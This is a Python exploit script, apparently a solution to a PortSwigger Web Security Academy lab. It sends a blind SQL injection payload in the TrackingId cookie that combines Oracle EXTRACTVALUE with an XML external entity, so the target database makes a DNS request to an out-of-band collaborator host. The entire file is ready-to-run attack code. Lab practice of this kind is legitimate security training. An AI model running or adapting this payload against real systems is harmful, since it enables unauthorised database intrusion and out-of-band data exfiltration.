import requests
from urllib.parse import quote

url = "https://0adb0031034eedab80b508ca0030008d.web-security-academy.net/"
session = "PyQm1lcdyzmnm1BmJ3IZkZcSYP9tESAA"
collaborator_domain = "vthdfgizsdhocpiqubhyo9zcnk4esfr9.oast.fun"   # exactly as in image

def build_payload():
    xml_entity = f'<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{collaborator_domain}/"> %remote;]>'
    encoded_xml = quote(f'<?xml version="1.0" encoding="UTF-8"?>{xml_entity}', safe='')
    payload = f"x'+UNION+SELECT+EXTRACTVALUE(xmltype('{encoded_xml}'),'/l')+FROM+dual--"
    return payload

def trigger_dns_lookup():
    tracking_id = build_payload()
    cookies = {
        "TrackingId": tracking_id,
        "session": session
    }
    print("[*] Sending payload...")
    resp = requests.get(url, cookies=cookies, timeout=10)
    print(f"[+] Status: {resp.status_code}")
    print("[+] DNS lookup sent. The lab should solve within a few seconds.")

if __name__ == "__main__":
    trigger_dns_lookup()